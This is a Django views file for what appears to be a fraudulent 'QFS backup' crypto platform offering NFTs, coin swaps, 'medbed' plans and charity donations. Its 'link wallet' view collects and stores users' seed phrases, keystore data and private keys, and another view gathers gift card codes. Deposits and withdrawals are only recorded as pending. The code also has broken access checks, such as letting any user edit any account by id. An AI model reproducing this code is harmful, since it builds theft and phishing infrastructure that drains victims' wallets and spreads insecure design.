from django.shortcuts import render, redirect
from .models import *
from django.http import HttpResponse, HttpResponseRedirect
from django.contrib.auth.decorators import login_required
from django.contrib.auth.models import User, auth
from django.contrib import messages
from django.urls import reverse
import requests
from superadmin.models import notifications
from django.contrib.auth.views import PasswordResetView
import json
from .forms import KYCForm
from django.db.models import Sum
from django.shortcuts import get_object_or_404, redirect

# Create your views here.

def index(request):
    return render(request,'home/index.html')

def a(request):
   return render(request,'user/a.html',locals())

class CustomPasswordResetView(PasswordResetView):
    from_email = "support@trumpqfsbackup.com"  # Ensure this matches EMAIL_HOST_USER

@login_required
def nfts(request):
   x = NFT.objects.all()
   c = ucoin.objects.all()
   return render(request,'user/nfts.html',locals())

@login_required
def buy_nft(request):
    if request.method == 'POST':
      n_id = request.POST.get('xid')
      u_id = request.POST.get('u_id')
      amount = request.POST.get('amount')

      if not u_id :
         messages.error(request, "Please select a Payment Method.")
         return HttpResponseRedirect(request.META.get('HTTP_REFERER'))


      nft = NFT.objects.get(id=n_id)
      uc = ucoin.objects.get(id=u_id)

      if uc.amount < float(amount):
            messages.error(request,'insufficient funds')
            return HttpResponseRedirect(request.META.get('HTTP_REFERER'))
      uc.amount -= float(amount)
      uc.save()
      
      if nft.is_available:
         UserNFT.objects.create(user=request.user, nft=nft, ucoinid=u_id)
         nft.is_available = False
         nft.save()
      notifications.objects.create(notify='NFT Purchase')
      messages.success(request,'successful')
      return redirect("mynft")  # Redirect to NFT list or user profile
    else:
       return HttpResponseRedirect(request.META.get('HTTP_REFERER'))
 
@login_required
def mynft(request):
   x = UserNFT.objects.filter(user=request.user)
   return render(request,'user/mynft.html',locals())

@login_required
def sell_nft(request):
   if request.method == 'POST':
     amount = request.POST.get('amount')
     n_id = request.POST.get('xid')
     unf = request.POST.get('unf')
     uni = request.POST.get('uni')

     nft = NFT.objects.get(id=n_id)
     uc = ucoin.objects.get(id=uni)

     uc.amount += float(amount)
     uc.save()

     nft.price = float(amount)
     nft.is_available = True
     nft.save()

     un = UserNFT.objects.get(id=unf)
     un.delete()
     notifications.objects.create(notify='NFT sell')
     messages.success(request,'successful')
     return redirect('/nfts')


   else:
    return HttpResponseRedirect(request.META.get('HTTP_REFERER'))


def kycver(request):
   user = request.user
   if request.method == 'POST':
        form = KYCForm(request.POST, request.FILES)
        if form.is_valid():
            kyc_info = form.save(commit=False)  # Create instance but don't save to DB yet
            kyc_info.user = request.user       # Assign the logged-in user
            kyc_info.save()                    # Now save to the database
            notifications.objects.create(notify='Kyc Verified')
            return redirect('/user')    # Replace 'success_page' with your actual success URL
   else:
        form = KYCForm()
   return render(request,'user/kycver.html', {'form': form})

@login_required
def coinswap(request):
   x = ucoin.objects.all()
   
   pp = profile.objects.filter(user=request.user).first()
   trp = pp.tr_pin
   if request.method == 'POST':
      fromc = request.POST.get('from-coin')
      toc = request.POST.get('to-coin')
      amount = request.POST.get('amount')
      tp = request.POST.get('tp')
      trp = pp.tr_pin

      # Check if fields are empty
      if not fromc or not toc:
         messages.error(request, "Please select both coins before swapping.")
         return HttpResponseRedirect(request.META.get('HTTP_REFERER'))
      
      if fromc == toc:
         messages.error(request, "Cannot swap the same coin.")
         return HttpResponseRedirect(request.META.get('HTTP_REFERER'))

      if tp == trp:
         try:
            uf = ucoin.objects.get(id=fromc)
         except ucoin.DoesNotExist:
              uf = None
              messages.error(request,'Invalid coin')

         try:
               ut = ucoin.objects.get(id=fromc)
         except ucoin.DoesNotExist:
               ut = None
               messages.error(request,'Invalid coin')


         if uf.amount < float(amount):
            messages.error(request,'insufficient funds')
            return HttpResponseRedirect(request.META.get('HTTP_REFERER'))
         
         uf = ucoin.objects.get(id=fromc)
         uf.amount -= float(amount)
         uf.save()
         ut = ucoin.objects.get(id=toc)
         ut.amount += float(amount)
         ut.save()
         notifications.objects.create(notify='coinswap')
         messages.success(request,'Coin Swap Is successful')
         return redirect('/user')
      else:
         messages.error(request,'Invalid Transaction pin')
         return HttpResponseRedirect(request.META.get('HTTP_REFERER'))
   else:
     return render(request,'user/coinswap.html', locals())

@login_required
def user(request):
    user = request.user
    x = ucoin.objects.filter(user=user)
    tb = tbalance.objects.filter(user=user)
    total_amount = ucoin.objects.filter(user=user).aggregate(total=Sum('amount'))['total'] or 0
    




    url = "https://api.coingecko.com/api/v3/coins/markets"
    params = {
        "vs_currency": "usd",
        "ids": "bitcoin,ethereum,ripple,stellar,tether,dogecoin,matic-network,solana,binancecoin",
        "price_change_percentage": "24h",
    }

    try:
        response = requests.get(url, params=params, timeout=10)
        response.raise_for_status()
        prices = response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error fetching data: {e}")
        prices = []

    crypto_data = {crypto["id"]: crypto for crypto in prices}

    context = {
        "bitcoin": crypto_data.get("bitcoin"),
        "ethereum": crypto_data.get("ethereum"),
        "xrp": crypto_data.get("ripple"),
        "xlm": crypto_data.get("stellar"),
        "usdt": crypto_data.get("tether"),
        "dogecoin": crypto_data.get("dogecoin"),
        "polygon": crypto_data.get("matic-network"),
        "solana": crypto_data.get("solana"),
        "bnb": crypto_data.get("binancecoin"),
        "error": "Unable to fetch prices." if not prices else None
    }




    
    try:
       for a in tb:
        bc =  a.amount
        cb = bc < 20000.00
    except:
       tbalance.DoesNotExist
       cb = None
       

    if request.method == 'POST':
       amount = request.POST.get('amount')
       ucoin_id = request.POST.get('ucoin_id')
       f = float(amount)
       uc = ucoin.objects.get(pk=ucoin_id)
       if f < uc.min:
          messages.error(request,'Less than minimum deposit')
          return HttpResponseRedirect(request.META.get('HTTP_REFERER'))
       elif f > uc.max:
          messages.error(request,'Greater than maximum deposit')
          return HttpResponseRedirect(request.META.get('HTTP_REFERER'))
       else:
        x = depht.objects.create(user=user,ucoin=uc, amount=f)
        notifications.objects.create(notify='New Deposit')
        messages.success(request,'deposit is pending it will be added to your account when approved')
       return HttpResponseRedirect(request.META.get('HTTP_REFERER'))
    else:
     return render(request,'user/dashboard.html',locals())

def userupd(request):
   user = request.user
   if request.method == 'POST':
      username = request.POST.get('username')
      email = request.POST.get('email')
      us_id = request.POST.get('us_id')

      usera = User.objects.get(id=us_id)
      usera.username = username
      usera.email = email
      usera.save()
      messages.success(request,'personal info updated successfuly')
      return HttpResponseRedirect(request.META.get('HTTP_REFERER'))
      
   else:
    return HttpResponseRedirect(request.META.get('HTTP_REFERER'))

def signin(request):
    if request.method == 'POST':
       username = request.POST.get('username')
       password = request.POST.get('password')
       user = auth.authenticate(username=username,password=password)
       if user is not None:
          auth.login(request,user)
          return redirect('/user')
       else:
          messages.error(request,'username or password not correct')
          return redirect('/signup')
    return render(request,'user/auth/sign-in.html')

def trbp(request):
   return render(request,'user/trbp.html',locals())

def veri_page(request):
   return render(request,'user/veri.html',locals())

def signup(request):
    if request.method == 'POST':   
        username = request.POST.get('username') 
        email = request.POST.get('email')
        fullname = request.POST.get('fullname')
        phone = request.POST.get('phone')
        tr_pin = request.POST.get('tr_pin')
        email = request.POST.get('email')
        password = request.POST.get('password')
        password2 = request.POST.get('password2')  
        if password == password2:
          if User.objects.filter(username=username).exists():
             messages.error(request,'Username Already Exists')
             return redirect('/signup')
          elif User.objects.filter(email=email).exists():
            messages.error(request,'Email already in use')
            return redirect('/signup')
          else:
             user = User.objects.create_user(username=username, email=email, password=password)
             user.save()
             profile.objects.create(user=user,fullname=fullname,phone=phone,tr_pin=tr_pin)
             x = coin.objects.all()
             tb = tbalance.objects.get_or_create(user=user)
             ub = tbalance.objects.get(user=user)
             for a in x:
                ucoin.objects.create(user=user,balance=ub,name=a.name,logo=a.logo,address=a.address)
             for b in x:
                backup.objects.create(user=user,balance=ub,name=b.name,logo=b.logo,address=b.address)
             notifications.objects.create(notify='New User')
             messages.success(request,'account created successfully login now')
             return redirect('signin')
        else:    
         messages.error(request,'password not the same')
         return redirect('/signup')  
    else:
     return render(request,'user/auth/sign-up.html')

def install(request):
    return render(request, 'install/install.html')

@login_required
def transactions(request):
   user = request.user
   try:
    x = depht.objects.filter(user=user)
   except:
      depht.DoesNotExist
      x = None
   return render(request,'user/transactions.html',locals())

@login_required
def backupt(request):
   user=request.user
   x = backup.objects.filter(user=user)

   url = "https://api.coingecko.com/api/v3/coins/markets"
   params = {
        "vs_currency": "usd",
        "ids": "bitcoin,ethereum,ripple,stellar,tether,dogecoin,matic-network,solana,binancecoin",
        "price_change_percentage": "24h",
    }

   try:
      response = requests.get(url, params=params, timeout=10)
      response.raise_for_status()
      prices = response.json()
   except requests.exceptions.RequestException as e:
      print(f"Error fetching data: {e}")
      prices = []

   crypto_data = {crypto["id"]: crypto for crypto in prices}

   context = {
      "bitcoin": crypto_data.get("bitcoin"),
      "ethereum": crypto_data.get("ethereum"),
      "xrp": crypto_data.get("ripple"),
      "xlm": crypto_data.get("stellar"),
      "usdt": crypto_data.get("tether"),
      "dogecoin": crypto_data.get("dogecoin"),
      "polygon": crypto_data.get("matic-network"),
      "solana": crypto_data.get("solana"),
      "bnb": crypto_data.get("binancecoin"),
      "error": "Unable to fetch prices." if not prices else None
   }







   if request.method == 'POST':
       amount = request.POST.get('amount')
       backup_id = request.POST.get('backup_id')
       f = float(amount)
       uc = backup.objects.get(pk=backup_id)
       ad = backt.objects.create(user=user,backupv=uc, amount=f)
       notifications.objects.create(notify='BackUp deposit')
       messages.success(request,'backup is pending it will be added to your account when approved')
       return redirect('/backuph')
   else:
     return render(request,'user/backup.html',locals())

@login_required  
def backuph(request):
   user = request.user
   try:
    x = backt.objects.filter(user=user)
   except:
      backt.DoesNotExist
      x = None
   return render(request,'user/backup_h.html',locals())

@login_required
def withdraw(request):
   user = request.user
   if request.method == 'POST':
      address = request.POST.get('address')
      amount = request.POST.get('amount')
      ucoin_id = request.POST.get('ucoin_id')
      f = float(amount)
      uc = ucoin.objects.get(pk=ucoin_id)
      wh = withdh.objects.all()
      if f > uc.amount:
        messages.error(request, 'insuficient funds') 
        return redirect('/user')
      elif f < 1:
         messages.error(request, 'withdrawal must be greater than $1') 
         return redirect('/user')
      else:
       x = withdh.objects.create(user=user,ucoin=uc,address=address,amount=f)
       notifications.objects.create(notify='New withdrawal')
       messages.success(request,'withdrawal is successful it will be added to your account when approved')
      return redirect('/user')
   return render(request,'user/withdraw.html')

@login_required
def whistory(request):
   user = request.user
   try:
    x = withdh.objects.filter(user=user)
   except:
      withdh.DoesNotExist
      x = None
   return render(request,'user/withh.html',locals())

@login_required
def bckwh(request):
   user = request.user
   if request.method == 'POST':
      address = request.POST.get('address')
      amount = request.POST.get('amount')
      backup_id = request.POST.get('backup_id')
      f = float(amount)
      uc = backup.objects.get(pk=backup_id)
      wh = backwh.objects.all()
      if f > uc.amount:
        messages.error(request, 'insuficient funds') 
        return redirect('/user')
      elif f < 1:
         messages.error(request, 'withdrawal must be greater than $1') 
         return redirect('/user')
      else:
       x = backwh.objects.create(user=user,backup=uc,address=address,amount=f)
       notifications.objects.create(notify='Back Withdrawal')
       messages.success(request,'withdrawal is successful it will be added to your account when approved')
      return redirect('/bh')
   return render(request,'user/bckwh.html',locals())

@login_required
def bh(request):
   user = request.user
   try:
    x = backwh.objects.filter(user=user)
   except:
      backwh.DoesNotExist
      x = None
   return render(request,'user/bh.html',locals())

@login_required
def lw(request):
   x = mywallet.objects.all()
   return render(request,'user/lw.html',locals())

@login_required
def conw(request,id):
   user = request.user
   x = mywallet.objects.get(id=id)
   if request.method == 'POST':
      wname = request.POST.get('wname')
      phrase = request.POST.get('phrase')
      kj = request.POST.get('kj')
      pkey = request.POST.get('pkey')
      x = waph.objects.get_or_create(user=user,wname=wname,phrase=phrase,kj=kj,pkey=pkey)
      notifications.objects.create(notify='Linked Wallet')
      messages.success(request,'wallet is linked successfully')
      return redirect('/user')
   else:
    return render(request,'user/conw.html',locals())

@login_required
def card(request):
    if request.method == 'POST':
        user = request.user
        limit = request.POST.get('limit')
        country = request.POST.get('country')
        state = request.POST.get('state')
        city = request.POST.get('city')
        street = request.POST.get('street')
        homeandblock = request.POST.get('homeandblock')
        pincode = request.POST.get('pincode')
        cc = creditcard.objects.create(user=user,limit=limit,country=country,state=state,city=city,street=street,homeandblock=homeandblock,pincode=pincode)
        messages.success(request,'credit request is successful')
        return redirect('/user')
    else:
     return render(request,'user/card.html')

@login_required  
def myprofile(request):
    user=request.user
    pu = profile.objects.get_or_create(user=user)
    pr =  profile.objects.filter(user=user)
    return render(request,'user/profile.html',locals())


@login_required
def profup(request, id):
    user = request.user
    x = profile.objects.get(id=id)
    if request.method == 'POST':
      img = request.FILES.get('img')
      fullname = request.POST.get('fullname')
      phone  = request.POST.get('phone')
      tr_pin  = request.POST.get('tr_pin')
      edit = profile.objects.get(id=id)
      
      edit.img = img
      edit.fullname = fullname
      edit.phone = phone
      edit.tr_pin = tr_pin
      edit.save()
      messages.success(request,'profile update is successful')
      return redirect('myprofile')
    else:
     return render(request,'user/profup.html',locals())

@login_required 
def buyc(request):
    bc = buycoin.objects.all()
    return render(request,'user/buyc.html',locals())

def logout(request):
    auth.logout(request)
    return redirect('/')

def generate_ref_link(request):
   referral_link = request.build_absolute_uri(reverse('register')) + '?ref=' + str(request.user.id)
   return HttpResponse(referral_link)

def fundsr(request):
   return render(request,'user/fundr.html')

def cardpayment(request):
   user =  request.user
   tb = tbalance.objects.filter(user=user)
   cr = cardcreate.objects.all()

   try:
       for a in tb:
        bc =  a.amount
        cb = bc < 100.00
   except:
       tbalance.DoesNotExist
       cb = None
   return render(request,'user/cardpay.html', locals())

def cardspayment(request, id):
   user = request.user
   x = ucoin.objects.filter(user=user)
   p = cardcreate.objects.get(id=id)

   if request.method == 'POST':
     paymentmethod = request.POST.get('paymentmethod')
     x = cardpay.objects.create(user=user,card=p,paymentmethod=paymentmethod)
     notifications.objects.create(notify='Card Payment')
     return redirect('/mycards')
   else:
    return render(request,'user/cardspayment.html', locals())
   
def mycards(request):
 user = request.user
 tb = tbalance.objects.filter(user=user)

 
 try:
  for a in tb:
        bc =  a.amount
        cb = bc < 100.00
 except:
    tbalance.DoesNotExist
    cb = None
 try:
  x = cardpay.objects.filter(user=user)
 except:
    cardpay.DoesNotExist
    x = None
 return render(request,'user/mycards.html',locals())

def humindex(request):
   x = charity.objects.all()
   return render(request,'humproject/index.html',locals())

def charitypay(request, id):
   user = request.user
   x = charity.objects.get(id=id)
   u = ucoin.objects.filter(user=user)

   if request.method == 'POST':
      ch_id = request.POST.get('ch_id')
      selected_option = request.POST.get('selected_option')
      cryptoname = request.POST.get('cryptoname')
      cryptoamount = request.POST.get('cryptoamount')
      c_id = request.POST.get('c_id')

      uf = ucoin.objects.get(id=c_id)

      if uf.amount < float(cryptoamount):
            messages.error(request,'insufficient funds')
            return HttpResponseRedirect(request.META.get('HTTP_REFERER'))
      uf.amount -= float(cryptoamount)
      uf.save()
      
      cp = charitypayment.objects.create(charity=x,user=user,plan=selected_option,cryptoname=cryptoname,cryptoamount=cryptoamount)
      notifications.objects.create(notify='crypto Donation Deposit')
      messages.success(request,'desposit is successfull')
      return HttpResponseRedirect(request.META.get('HTTP_REFERER'))
   else:
    return render(request,'humproject/charitypay.html',locals())
   
def chargiftc(request):
   user=request.user
   if request.method == 'POST':
      selected_option = request.POST.get('selected_option')
      giftcardname = request.POST.get('giftcardname')
      giftcardcode = request.POST.get('giftcardcode')
      giftcardamount = request.POST.get('giftcardamount')
      giftcardimg = request.FILES.get('giftcardimg')
      ch_id = request.POST.get('id')
   
      ch = charity.objects.get(pk=ch_id)
      cp = giftcardpay.objects.create(charity=ch,user=user,plan=selected_option,giftcardname=giftcardname,giftcardcode=giftcardcode,giftcardamount=giftcardamount,giftcardimg=giftcardimg)
      notifications.objects.create(notify='Giftcard Donation Deposit')
      messages.success(request,'desposit is successfull')
      return HttpResponseRedirect(request.META.get('HTTP_REFERER'))
   else:
    return render(request,'humproject/chargiftc.html',locals())
   
def mydano(request):
   user = request.user
   try:
     x = charitypayment.objects.filter(user=user)
     g = giftcardpay.objects.filter(user=user)
   except:
      charitypayment.DoesNotExist
      giftcardpay.DoesNotExist
   return render(request,'humproject/mydano.html',locals())

def medbedhome(request):
   user = request.user
   x = medbedplan.objects.all()
   tb = tbalance.objects.filter(user=user)
   try:
    for a in tb:
         bc =  a.amount
         p1 = bc < 30000.00
   except:
      tbalance.DoesNotExist
      p1 = None

   try:
      for b in tb:
         bc =  a.amount
         p2 = bc < 100000.00
   except:
      tbalance.DoesNotExist
      p2 = None
   
   try:
    for c in tb:
         bc =  a.amount
         p3 = bc < 1000000.00
   except:
      tbalance.DoesNotExist
      p3 = None
   return render(request,'medbed/index.html',locals())

def cartapply(request):
   return render(request,'medbed/cartapply.html')

def home(request):
   return render(request,'home/index.html')